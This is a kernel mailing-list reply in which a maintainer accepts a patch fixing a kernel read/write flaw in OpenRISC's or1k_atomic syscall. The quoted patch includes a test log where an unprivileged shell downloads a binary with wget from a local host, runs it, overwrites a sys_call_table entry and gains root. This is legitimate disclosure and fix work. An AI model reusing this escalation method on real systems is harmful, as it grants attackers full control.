Received: from mail-wm1-f50.google.com (mail-wm1-f50.google.com [209.85.128.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6643F33D503
	for <linux-kernel@vger.kernel.org>; Sat, 29 Aug 2026 06:29:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.50
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787984975; cv=none; b=XVMP56YRJUit6f6527Ki0nFwCsok/Vnu1Ic6JOcYXKcgs1O04zCVVGfzre939lqkxYfB986BCOfoO5usRtQbyxHxE0bASlVebZ2XzZLRA4EJ6PM+19UpI9KCv8qy8lcTv4+TJqNEQwj/H89Axd8l1Jjoq0v8aHlfv+k5J7f5frs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787984975; c=relaxed/simple;
	bh=SiU/2OsQxhZj+EY9kQ5PjA3CQm4G6D2vCxthW14z8rY=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=EUm3P7eZKJc3U2E3aDx/UEyfKzE3EGjpWy4VPNZ4tmG2ZGz8LmTZDSwz0NxBYt4zMBUcZ13qZ9rMASrbfdLqYlFKHTH56IAEDn7dnt1a2v+5V6mQ1Ri4T5n0mTrrMRv08M20q8L8GSI6RaQzi4Jj1yLv8c23wg3ohnw/Y4mP+s8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ZB996Zv0; arc=none smtp.client-ip=209.85.128.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ZB996Zv0"
Received: by mail-wm1-f50.google.com with SMTP id 5b1f17b1804b1-4953e04ef16so16412055e9.2
        for <linux-kernel@vger.kernel.org>; Fri, 28 Aug 2026 23:29:33 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1787984971; x=1788589771; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=2zLACw0pXpUYULJDZoulM61mRMjzPQIqT274DyKnsS4=;
        b=ZB996Zv0BxqDTCG56kzqwKiqgPNNI0qZ9qIpHbg4ua2HTiMgiwBy60QuCHP4cl8FBC
         VUELCUOCb6KP3uLAlfAsY3yKosksDGcwTwlw0uG8rBLNwTLY3gZmRMJZhpGroslOu6ni
         thCcVAKSMGBgVKSC8rOecso/iMabDChWXFJyK5Q8USwdSK2EZqAbgsYD8HbIp0PBHtL+
         SLWlZnOIrOHHbhACmSZMl3mdrZdUoDr6GKdWUFtS3u0PuTpcqyP71mf16JE78c0VQtkB
         aUCaz6VqUnoC5uhTxVi6E/tBDOlbxBftkeqTF2vtn4zPCl4bVsWx/05hrTwlucyR1U5W
         rjWA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787984971; x=1788589771;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=2zLACw0pXpUYULJDZoulM61mRMjzPQIqT274DyKnsS4=;
        b=j56sZrz8BJW4I4BaB2XtRz6ib7Um8fHxDg/8mm5+AWxTxvD5Zw7dcd01FNFUCO2x/W
         S4LKC2PWujwtvi/De9fUgK4MGdRY0MoAM1fhWoxms9hZvmTlBsCndYpTKDD/d2IRHDfE
         /aLo6rHXPz/9ehduEE/pmWMCk4YOGnCxizpLlyTri3b7pCP6ZjNI7NXMYAa7uBj+CNmV
         RMDv1Mc6wGMcqhwDAQt60bDQte9p4aRt9z0gLct7FG6m9NVTkNdkjUw1HS2kol3Z9OxA
         V2+ODdUNUJYrgsL4ip1IWuPLKELS3fSnQW5r1BXIB/zCbiYnq9Mw7ACe74B0EI2z5XVI
         6u3w==
X-Forwarded-Encrypted: i=1; AHgh+RrltcZQLDo48HIh03avreHjemdMxcZG/7bm3ScwXxJVfJ+UpJQ/bXDA8znIOdNyylqFCS1kt0hv0e/ozes=@vger.kernel.org
X-Gm-Message-State: AFuF++mICPyLkarYszdBtOXKKeOK/I+Iuif/HIQ7PKgOQXht2P8KwSR7
	+mSos7IsIOynDO/qzHnXApDYOGvnc1ck7Mugqi9hjdxN0raQm2RoPMoY
X-Gm-Gg: AR+sD12iVKpiBWHnKgA1rRsdUus3/BfUePIj/tzQvyZtlpBzzSnS2y4VPadMPINaEyN
	g1XceifjOf7wgdeA4XVfyEGFt1onvx82npVlWS685oMKT/inwfB4qoJEcxtGCB+YJq5T/AL6pnB
	RaSODCUXB2j4GYzjM0K6bOajB4PeRe3k7EfJ3Sx8xL95ogXKxro5KeqrUOGYsu49EL+H2R1iO9K
	Z3U0aWhYl21tZVatZxmb8fjJavOxmFeKW1vEc20Rx4XSXUU7VxDmSMdMcIoMu6HY0cmsLPrgINF
	Gx7zIQk/0acOXwzla0QlWogAxztv+CWHRV6XcNaQ7TH9SepYdc4J3TNzCGBVqEVxzypJX9s8nUO
	SIIiWd6yvUHs5w5gm892lX/r45Ta38ucJhSHykpYwRIJGCi3Gpc4zB7ofn3m7/efxb18LMvs5eG
	XFp9g9YYL5Ahg1vUxC8SH5OsRPz2YxumVhs4vq7M8xSolvz1+NjHAE50QJf40rwfswI4dObQm4+
	8D2l/E+oEBkyr79iS+27tAPnFFs6A5xG2f8GZcgYrw=
X-Received: by 2002:a05:600c:3145:b0:499:79b9:e220 with SMTP id 5b1f17b1804b1-49b91c44f6cmr174203445e9.10.1787984971174;
        Fri, 28 Aug 2026 23:29:31 -0700 (PDT)
Received: from localhost (brnt-04-b2-v4wan-170138-cust2432.vm7.cable.virginm.net. [94.175.9.129])
        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-482fbb20793sm8088685f8f.17.2026.08.28.23.29.30
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 28 Aug 2026 23:29:30 -0700 (PDT)
Date: Sat, 29 Aug 2026 07:29:29 +0100
From: Stafford Horne <shorne@gmail.com>
To: Ali Ahmet Memis <ali@iusegentoo.com>
Cc: Jonas Bonn <jonas@southpole.se>,
	Stefan Kristiansson <stefan.kristiansson@saunalahti.fi>,
	Arnd Bergmann <arnd@arndb.de>, linux-openrisc@vger.kernel.org,
	linux-kernel@vger.kernel.org, stable@vger.kernel.org
Subject: Re: [PATCH v2] openrisc: fix arbitrary kernel memory access via
 or1k_atomic syscall
Message-ID: <apJ8SWRA0PxaQEs9@antec>
References: <20260821013839.587041-1-ali@iusegentoo.com>
 <20260821014543.588228-1-ali@iusegentoo.com>
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260821014543.588228-1-ali@iusegentoo.com>

On Fri, Aug 21, 2026 at 01:45:27AM +0000, Ali Ahmet Memis wrote:
> sys_or1k_atomic() (syscall 244 in the "or1k" ABI) takes two user
> pointers, v1 and v2, and swaps the words they point to in hand-written
> assembly.
> 
>     l.lwz   r29,0(r4)
>     l.lwz   r27,0(r5)
>     l.sw    0(r4),r27
>     l.sw    0(r5),r29
> 
> The pointers are not checked with access_ok(). The four memory
> accesses also have no exception table entries.
> 
> A caller passes a kernel address as either pointer, and the syscall
> reads from and writes to it directly.
> 
> This gives an unprivileged process a kernel read/write primitive. It
> overwrites kernel data such as the sys_call_table, gaining code
> execution in kernel context.
> 
> Check both pointers before entering the critical section. Add fixups
> for the four memory accesses so faults on valid but unmapped user
> addresses return -EFAULT.
> 
> Fixes: 9d02a4283e9c ("OpenRISC: Boot code")
> Cc: stable@vger.kernel.org
> Signed-off-by: Ali Ahmet Memis <ali@iusegentoo.com>
> ---
> v2: add Cc: stable@vger.kernel.org, missed in v1.
> 
> Tested against an unpatched or1ksim build with a local PoC that uses
> this syscall to overwrite a sys_call_table entry and escalate to root:
> 
> ali@archlinux:~$ cd ~/or1k-build/buildroot/output/images
> ali@archlinux:~/or1k-build/buildroot/output/images$ qemu-system-or1k -kernel vmlinux -nographic -append "console=ttyS0"
> FDT at (ptrval)
> Linux version 6.18.7 (ali@archlinux) (or1k-buildroot-linux-musl-gcc.br_real (Buildroot -g86102dd8) 15.3.0, GNU ld (GNU Binutils) 2.45.1) #5 Fri Aug 21 00:38:10 UTC 2026
> OF: reserved mem: Reserved memory: No reserved-memory node in the DT
> CPU: OpenRISC-13 (revision 8) @20 MHz
> -- dmmu:  128 entries, 1 way(s)
> -- immu:  128 entries, 1 way(s)
> -- additional features:
> -- power management
> -- PIC
> -- timer
> Initial ramdisk not found
> Setting up paging and PTEs.
> map_ram: Memory: 0x0-0x8000000
> Zone ranges:
>   Normal   [mem 0x0000000000000000-0x0000000007ffffff]
> Movable zone start for each node
> Early memory node ranges
>   node   0: [mem 0x0000000000000000-0x0000000007ffffff]
> Initmem setup node 0 [mem 0x0000000000000000-0x0000000007ffffff]
> itlb_miss_handler (ptrval)
> dtlb_miss_handler (ptrval)
> OpenRISC Linux -- http://openrisc.io
> Kernel command line: console=ttyS0
> printk: log buffer data + meta data: 131072 + 409600 = 540672 bytes
> Dentry cache hash table entries: 16384 (order: 3, 65536 bytes, linear)
> Inode-cache hash table entries: 8192 (order: 2, 32768 bytes, linear)
> Sorting __ex_table...
> Built 1 zonelists, mobility grouping on.  Total pages: 16384
> mem auto-init: stack:all(zero), heap alloc:off, heap free:off
> mem_init_done ...........................................
> SLUB: HWalign=16, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
> NR_IRQS: 32, nr_irqs: 32, preallocated irqs: 0
> clocksource: openrisc_timer: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 95563022313 ns
> Console: colour dummy device 80x25
> 40.00 BogoMIPS (lpj=80000)
> $ id
> uid=1000(test) gid=1000(test) groups=1000(test)
> $ wget -O /tmp/x http://10.0.2.2:8000/lpe_static
> Connecting to 10.0.2.2:8000 (10.0.2.2:8000)
> saving to '/tmp/x'
> x                    100% |********************************|  174k  0:00:00 ETA
> '/tmp/x' saved
> $ chmod +x /tmp/x
> $ /tmp/x
> Initial: uid=1000 euid=1000
> Installing commit_creds into getuid entry
> sys_call_table[174] overwritten
> original handler = 0xc002e2ac
> Calling hijacked syscall with init_cred
> hijacked syscall returned 0
> Restoring original getuid handler
> syscall table restored
> Final identity: uid=0 euid=0
> # id
> uid=0(root) gid=0(root)
> #
> 
>  arch/openrisc/kernel/entry.S | 42 ++++++++++++++++++++++++++++++++++++++---
>  1 file changed, 39 insertions(+), 3 deletions(-)
> 
> diff --git a/arch/openrisc/kernel/entry.S b/arch/openrisc/kernel/entry.S
> index c7e90b09645e..2e8c4102cd62 100644
> --- a/arch/openrisc/kernel/entry.S
> +++ b/arch/openrisc/kernel/entry.S
> @@ -1223,15 +1223,49 @@ _no_syscall_trace:
>   *
>   */
> 
> +/* Keep this literal; hi()/lo() can't use the UL-suffixed TASK_SIZE. */
> +#define OR1K_ATOMIC_ADDR_LIMIT	0x7ffffffc

OK, it would have been good to use TASK_SIZE.

>  ENTRY(sys_or1k_atomic)

Note, I don't know of any applications that actually use this, we should
deprecated this syscall.  But I do see it available in musl and strace, it would
take some time to cleanup.

>  	/* FIXME: This ignores r3 and always does an XCHG */
> +
> +	/* Check both user pointers before accessing them. */
> +	l.movhi	r13,hi(OR1K_ATOMIC_ADDR_LIMIT)
> +	l.ori	r13,r13,lo(OR1K_ATOMIC_ADDR_LIMIT)
> +	l.sfgtu	r4,r13
> +	l.bf	9f
> +	 l.nop
> +	l.sfgtu	r5,r13
> +	l.bf	9f
> +	 l.nop
> +
>  	DISABLE_INTERRUPTS(r17,r19)
> -	l.lwz	r29,0(r4)
> -	l.lwz	r27,0(r5)
> -	l.sw	0(r4),r27
> -	l.sw	0(r5),r29
> +10:	l.lwz	r29,0(r4)
> +11:	l.lwz	r27,0(r5)
> +12:	l.sw	0(r4),r27
> +13:	l.sw	0(r5),r29
>  	ENABLE_INTERRUPTS(r17)
>  	l.jr	r9
>  	 l.or	r11,r0,r0
> 
> +	/* Either pointer was outside user space, or turned out to be
> +	 * unmapped/inaccessible when we actually touched it.
> +	 */
> +9:	l.jr	r9
> +	 l.addi	r11,r0,-EFAULT
> +
> +	.section .fixup, "ax"
> +14:
> +	ENABLE_INTERRUPTS(r17)
> +	l.j	9b
> +	 l.nop
> +	.previous
> +
> +	.section __ex_table, "a"
> +	.long	10b, 14b
> +	.long	11b, 14b
> +	.long	12b, 14b
> +	.long	13b, 14b
> +	.previous
> +

Thanks,

I will send this upstream.

-Stafford
